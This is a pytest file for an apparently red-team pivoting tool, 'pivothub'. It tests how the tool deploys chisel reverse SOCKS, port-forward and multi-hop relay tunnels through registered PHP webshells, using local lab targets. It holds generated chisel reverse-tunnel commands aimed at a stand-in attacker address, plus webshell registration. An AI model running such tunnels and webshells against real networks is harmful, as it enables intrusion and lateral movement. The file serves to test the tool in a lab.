"""三种链路类型（socks / portfwd / relay）真实部署测试 + 多级中继推导。

真实组件：本机 chisel 双端（tools/）+ miniweb 联调靶（真实子进程执行命令）。
本机（Windows）没有 Linux pty，这里把靶机平台显式设为 windows —— 与
「无 Docker 时用 miniweb 验证」的环境约束一致（见 docs/VERIFY.md）。
"""

from __future__ import annotations

import os
import socket
import subprocess
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent

#: 本测试会话真实启动过的 chisel pid（只清理自己的，绝不全机按映像名清理）
_SESSION_PIDS: set[int] = set()
#: 本测试会话使用过的目标侧暂存目录（用于兜底按命令行定位漏记的客户端进程）
_SESSION_DIRS: set[str] = set()


def _kill_pid(pid: int) -> bool:
    if sys.platform == "win32":
        return subprocess.run(["taskkill", "/F", "/PID", str(int(pid))],
                              capture_output=True, text=True).returncode == 0
    subprocess.run(["kill", "-9", str(int(pid))], capture_output=True)
    return True


def _remember_pids(body: dict) -> None:
    for rec in (body or {}).get("pids") or []:
        if rec.get("pid"):
            _SESSION_PIDS.add(int(rec["pid"]))
    for rec in ((body or {}).get("link") or {}).get("pids") or []:
        if rec.get("pid"):
            _SESSION_PIDS.add(int(rec["pid"]))


def _sweep_by_dir() -> int:
    """按命令行里的会话专属暂存目录兜底清理（只匹配本次会话的目录）。"""
    if sys.platform != "win32" or not _SESSION_DIRS:
        return 0
    killed = 0
    for d in sorted(_SESSION_DIRS):
        ps = ("Get-CimInstance Win32_Process -Filter \"Name='chisel.exe'\" "
              f"| Where-Object {{$_.CommandLine -like '*{d}*'}} "
              "| ForEach-Object {$_.ProcessId}")
        out = subprocess.run(["powershell", "-NoP", "-NonI", "-Command", ps],
                             capture_output=True, text=True).stdout
        for line in out.splitlines():
            line = line.strip()
            if line.isdigit() and _kill_pid(int(line)):
                killed += 1
    return killed


def _clean_session_processes() -> int:
    """只结束本测试会话启动的 chisel 进程（不碰同机其他会话/手工调试的隧道）。

    说明：早期版本按 IMAGENAME 全量 taskkill，会在多会话并存时互相杀死对方的
    隧道服务端，导致 wait_callback 阶段假失败（服务端进程退出）。
    """
    killed = 0
    for pid in sorted(_SESSION_PIDS):
        from pivothub.util import proc_alive
        if proc_alive(pid) and _kill_pid(pid):
            killed += 1
    killed += _sweep_by_dir()
    _SESSION_PIDS.clear()
    return killed


@pytest.fixture(scope="session", autouse=True)
def _cleanup_chisel():
    _clean_session_processes()
    yield
    _clean_session_processes()
    _SESSION_DIRS.clear()


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return int(s.getsockname()[1])


def _remote_dir(tag: str = "") -> str:
    """每个用例独立暂存目录（避免与遗留进程占用/同名文件冲突）。"""
    name = f".pivothub-pytest-{os.getpid()}" + (f"-{tag}" if tag else "")
    base = Path(os.environ.get("TEMP", "/tmp")) / name
    base.mkdir(parents=True, exist_ok=True)
    _SESSION_DIRS.add(str(base))
    return str(base)


def _wait_port(port: int, timeout: float = 20.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return True
        except OSError:
            time.sleep(0.4)
    return False


class Miniweb:
    """真实可执行命令的联调靶（scripts/lab/miniweb，仅 127.0.0.1）。"""

    def __init__(self, port: int, pwd: str = "cmd") -> None:
        self.port = port
        self.pwd = pwd
        self.proc: subprocess.Popen | None = None

    def start(self) -> "Miniweb":
        self.proc = subprocess.Popen(
            [sys.executable, str(ROOT / "scripts/lab/miniweb/miniweb.py"),
             "--port", str(self.port), "--pwd", self.pwd,
             "--dir", str(ROOT / "scripts/lab/wwwroot")],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=(getattr(subprocess, "CREATE_NO_WINDOW", 0)),
        )
        assert _wait_port(self.port), f"miniweb:{self.port} 未就绪"
        return self

    def stop(self) -> None:
        if self.proc:
            try:
                self.proc.kill()
            except Exception:
                pass
            self.proc = None

    @property
    def url(self) -> str:
        return f"http://127.0.0.1:{self.port}/shell.php"


@pytest.fixture()
def lab_targets():
    """两个联调靶：L1 跳板机 / L2 双网卡节点（真实命令执行）。"""
    a, b = Miniweb(_free_port()), Miniweb(_free_port())
    a.start()
    b.start()
    yield a, b
    a.stop()
    b.stop()


def _add_host_and_shell(client, *, ip: str, hostname: str, url: str, layer: str = "L2",
                        segment: str = "10.85.101.0/24", ifaces=None,
                        project_id: str = "proj-1") -> tuple[str, str]:
    r = client.post("/api/hosts", json={
        "ip": ip, "hostname": hostname, "os": "Windows Server 2019", "layer": layer,
        "segment": segment, "note": "pytest 联调靶", "ifaces": ifaces or [],
        "projectId": project_id,
    })
    assert r.status_code == 200, r.text
    host_id = r.json()["id"]
    r = client.post("/api/shells", json={
        "hostId": host_id, "type": "PHP 一句话马", "url": url, "pass": "cmd",
        "encoder": "none", "projectId": project_id,
    })
    assert r.status_code == 200, r.text
    return host_id, r.json()["id"]


# ---------------------------------------------------------------------------
# 命令生成（与前端 proxy.js 模板一致）
# ---------------------------------------------------------------------------

def test_generate_config_three_link_types():
    from pivothub.adapters import ChiselAdapter

    a = ChiselAdapter()
    base = dict(lhost="192.0.2.10", server_port=1331, local_port=10006, auth="u:p")
    socks = a.generate_config(**base, link_type="socks")
    assert socks["server"] == "./chisel server -p 1331 --reverse --auth u:p"
    assert socks["target"] == "./chisel client --auth u:p 192.0.2.10:1331 R:0.0.0.0:10006:socks"

    fwd = a.generate_config(**base, link_type="portfwd", target_host="10.85.101.3",
                            target_port=80)
    assert fwd["target"] == \
        "./chisel client --auth u:p 192.0.2.10:1331 R:0.0.0.0:10006:10.85.101.3:80"

    relay = a.generate_config(**base, link_type="relay", relay_addr="10.85.101.3",
                              relay_port=1331)
    assert relay["relay"] == "./chisel client --auth u:p 192.0.2.10:1331 1331:1331"
    assert relay["target"] == \
        "./chisel client --auth u:p 10.85.101.3:1331 R:0.0.0.0:10006:socks"


# ---------------------------------------------------------------------------
# 多级中继推导（与前端规则一致）
# ---------------------------------------------------------------------------

def test_relay_plan_matches_frontend_rules(client):
    r = client.get("/api/links/relay-plan", params={
        "fromHostId": "h-l2-01", "listenPort": 1331, "localPort": 10005})
    assert r.status_code == 200
    p = r.json()
    # relayAddr = 上一层跳板（h-l1-01）在「本层网段 10.85.101.0/24」里的 IP（ifaces 的 eth1）
    assert p["relayAddr"] == "10.85.101.3"
    assert p["relayHostId"] == "h-l1-01" and p["upstreamLinkId"] == "p-1"
    assert p["relayPort"] == 1331 and p["dualHomed"] is True
    # 目标网段 = 本层双网卡机第二块网卡所在段
    assert p["targetSegment"] == "172.56.102.0/24"
    assert len(p["hops"]) == 3
    assert p["hops"][1]["cmd"] == "./chisel client 192.0.2.10:1331 1331:1331"
    assert p["hops"][2]["cmd"] == "./chisel client 10.85.101.3:1331 R:0.0.0.0:10005:socks"


def test_relay_plan_without_upstream_degrades(client):
    """单网卡主机（无覆盖其网段的存活上游链路）→ 无需中继，诚实说明。"""
    r = client.get("/api/links/relay-plan", params={"fromHostId": "h-l1-02"})
    p = r.json()
    assert p["relayAddr"] == "" and p["upstreamLinkId"] == ""
    assert "无需中继" in p["reason"]


def test_next_segment_and_addr_in_helpers():
    from pivothub.service import addr_in, next_segment_of

    class H:
        ip = "10.85.101.4"
        segment = "10.85.101.0/24"
        ifaces = [{"iface": "eth0", "ip": "10.85.101.4", "segment": "10.85.101.0/24"},
                  {"iface": "eth1", "ip": "172.56.102.4", "segment": "172.56.102.0/24"}]

    class R:
        ip = "192.168.100.2"
        ifaces = [{"iface": "eth0", "ip": "192.168.100.2", "segment": "192.168.100.0/24"},
                  {"iface": "eth1", "ip": "10.85.101.3", "segment": "10.85.101.0/24"}]

    assert next_segment_of(H(), ["192.168.100.0/24", "10.85.101.0/24", "172.56.102.0/24"]) \
        == "172.56.102.0/24"
    assert addr_in(R(), "10.85.101.0/24") == "10.85.101.3"
    assert addr_in(R(), "172.56.102.0/24") == "192.168.100.2"  # 找不到回落主 IP


# ---------------------------------------------------------------------------
# 真实部署：三种链路类型
# ---------------------------------------------------------------------------

def _deploy(client, tag: str = "", project_id: str = "proj-1", **kw):
    # 本机联调全链路都在回环上：客户端监听也收窄到 127.0.0.1，
    # 否则每次都会在随机临时路径上绑 0.0.0.0 → Windows 防火墙反复弹窗
    body = {"projectId": project_id, "tool": "chisel", "attackIp": "127.0.0.1",
            "bindHost": "127.0.0.1", "bindAddr": "127.0.0.1", "platform": "windows",
            "waitS": 30, "verify": True, "remoteDir": _remote_dir(tag)}
    body.update(kw)
    r = client.post("/api/links/deploy", json=body)
    try:
        _remember_pids(r.json())
    except Exception:
        pass
    return r


def _kill_link(client, link_id: str):
    r = client.delete(f"/api/links/{link_id}")
    assert r.status_code == 200
    return r.json()


def test_deploy_socks_link_real(client, lab_targets, sandbox_project):
    """① socks：真实回连 + 本机 socks 入口经隧道读到目标服务。"""
    mw_a, _ = lab_targets
    listen, local = _free_port(), _free_port()
    host_id, shell_id = _add_host_and_shell(
        client, ip="10.85.101.60", hostname="pytest-socks", url=mw_a.url, project_id=sandbox_project)

    r = _deploy(client, tag="socks", project_id=sandbox_project, shellId=shell_id,
                linkType="socks", listenPort=listen,
                localPort=local, targetSegment="10.85.101.0/24",
                targetHost="127.0.0.1", targetPort=mw_a.port)
    body = r.json()
    assert r.status_code == 200 and body["ok"] is True, body
    link = body["link"]
    assert link["linkType"] == "socks"
    assert link["localSocks"] == f"127.0.0.1:{local}"
    assert link["listenPort"] == listen and link["localPort"] == local
    assert link["pid"] and any(p["role"] == "server" for p in link["pids"])
    assert any(p["role"] == "target" and p["pid"] for p in link["pids"])
    assert len(link["hops"]) == 2
    # 隧道内真实性：本机 socks 入口经隧道连到目标服务
    assert body["verify"]["ok"] is True, body["verify"]
    assert body["verify"]["target"] == f"127.0.0.1:{mw_a.port}"
    assert _wait_port(local)

    # 健康检查：进程存活 → alive
    chk = client.post(f"/api/links/{link['id']}/check").json()
    assert chk["status"] == "alive"

    # 销毁：逐层清理，端口关闭、进程不存在
    killed = _kill_link(client, link["id"])["killed"]
    assert killed and all(k["killed"] for k in killed if k["pid"])
    time.sleep(1.0)
    assert not _wait_port(local, timeout=2)
    from pivothub.util import proc_alive
    assert not any(proc_alive(k["pid"]) for k in killed if k["pid"])


def test_deploy_portfwd_link_real(client, lab_targets, sandbox_project):
    """② portfwd：单端口转发，本机 localPort 直接读到目标服务回显。"""
    mw_a, _ = lab_targets
    listen, local = _free_port(), _free_port()
    host_id, shell_id = _add_host_and_shell(
        client, ip="10.85.101.61", hostname="pytest-portfwd", url=mw_a.url, project_id=sandbox_project)

    r = _deploy(client, tag="fwd", project_id=sandbox_project, shellId=shell_id,
                linkType="portfwd", listenPort=listen,
                localPort=local, targetHost="127.0.0.1", targetPort=mw_a.port,
                targetSegment="10.85.101.0/24")
    body = r.json()
    assert body["ok"] is True, body
    link = body["link"]
    assert link["linkType"] == "portfwd"
    assert link["targetHost"] == "127.0.0.1" and link["targetPort"] == mw_a.port
    assert body["verify"]["ok"] is True, body["verify"]
    # 直连 localPort 读到真实回显
    from pivothub.adapters import read_banner
    ok, text = read_banner(local, probe=b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
    assert ok and ("miniweb" in text or "HTTP" in text), text

    _kill_link(client, link["id"])
    time.sleep(0.8)
    assert not _wait_port(local, timeout=2)


def test_deploy_relay_link_three_hops_real(client, lab_targets, sandbox_project):
    """③ relay：三层链路真实跑通（攻击机监听 → 上层跳板中继 → 本层节点回连）。"""
    mw_a, mw_b = lab_targets
    # 真实网络中攻击机监听端口与上层跳板中继端口同为 1331（分处两台主机）；
    # 本机全链路自测时两者同机，必须用不同端口（否则 chisel 无法重复绑定）。
    listen, relay_listen, local = _free_port(), _free_port(), _free_port()
    # 上层跳板（L1，双网卡）+ 本层双网卡节点（L2）
    relay_host_id, relay_shell_id = _add_host_and_shell(
        client, ip="192.168.100.61", hostname="pytest-relay-l1", url=mw_a.url, layer="L1",
        segment="192.168.100.0/24", project_id=sandbox_project,
        ifaces=[{"iface": "eth0", "ip": "192.168.100.61", "segment": "192.168.100.0/24"},
                {"iface": "eth1", "ip": "10.85.101.61", "segment": "10.85.101.0/24"}])
    node_host_id, node_shell_id = _add_host_and_shell(
        client, ip="10.85.101.62", hostname="pytest-relay-l2", url=mw_b.url, layer="L2",
        segment="10.85.101.0/24", project_id=sandbox_project,
        ifaces=[{"iface": "eth0", "ip": "10.85.101.62", "segment": "10.85.101.0/24"},
                {"iface": "eth1", "ip": "172.56.102.62", "segment": "172.56.102.0/24"}])

    r = _deploy(client, tag="relay", project_id=sandbox_project, shellId=node_shell_id,
                relayShellId=relay_shell_id,
                linkType="relay", listenPort=listen, relayPort=relay_listen,
                localPort=local, relayAddr="127.0.0.1",
                targetHost="127.0.0.1", targetPort=mw_a.port,
                targetSegment="172.56.102.0/24")
    body = r.json()
    assert body["ok"] is True, body
    link = body["link"]
    assert link["linkType"] == "relay"
    assert link["relayAddr"] == "127.0.0.1" and link["relayPort"] == relay_listen
    assert link["toHostId"] == relay_host_id  # 出口 = 上层跳板
    roles = {p["role"] for p in link["pids"]}
    assert roles == {"server", "relay", "target"}, link["pids"]
    assert all(p["pid"] for p in link["pids"]), link["pids"]  # 每步 pid 都落库
    assert len(link["hops"]) == 3
    # 隧道内真实性：经三层链路读到目标服务
    assert body["verify"]["ok"] is True, body["verify"]

    killed = _kill_link(client, link["id"])["killed"]
    time.sleep(1.0)
    from pivothub.util import proc_alive
    assert not any(proc_alive(k["pid"]) for k in killed if k["pid"]), killed
    assert not _wait_port(local, timeout=2)
    assert not _wait_port(relay_listen, timeout=2)


def test_deploy_failure_reports_real_stage(client, lab_targets, sandbox_project):
    """不伪造成功：目标服务不可达 → 真实阶段 verify + 原因，且进程已回滚。"""
    mw_a, _ = lab_targets
    listen, local = _free_port(), _free_port()
    host_id, shell_id = _add_host_and_shell(
        client, ip="10.85.101.63", hostname="pytest-fail", url=mw_a.url, project_id=sandbox_project)
    dead = 1  # 没有任何服务监听（TCPMUX 通常关闭）
    r = _deploy(client, tag="fail", project_id=sandbox_project, shellId=shell_id,
                linkType="portfwd", listenPort=listen,
                localPort=local, targetHost="127.0.0.1", targetPort=dead)
    body = r.json()
    assert body["ok"] is False
    assert body["stage"] in ("verify", "wait_callback"), body
    if body["stage"] == "verify":
        assert "目标服务不可达" in body["error"]
    time.sleep(0.8)
    assert not _wait_port(local, timeout=2)  # 回滚后端口不再监听


def test_deploy_relay_requires_relay_shell(client, lab_targets, sandbox_project):
    mw_a, _ = lab_targets
    _, shell_id = _add_host_and_shell(
        client, ip="10.85.101.64", hostname="pytest-relay-err", url=mw_a.url, project_id=sandbox_project)
    r = _deploy(client, tag="err", project_id=sandbox_project, shellId=shell_id,
                linkType="relay", listenPort=_free_port(),
                localPort=_free_port(), relayAddr="127.0.0.1")
    body = r.json()
    assert body["ok"] is False and body["stage"] == "relay"
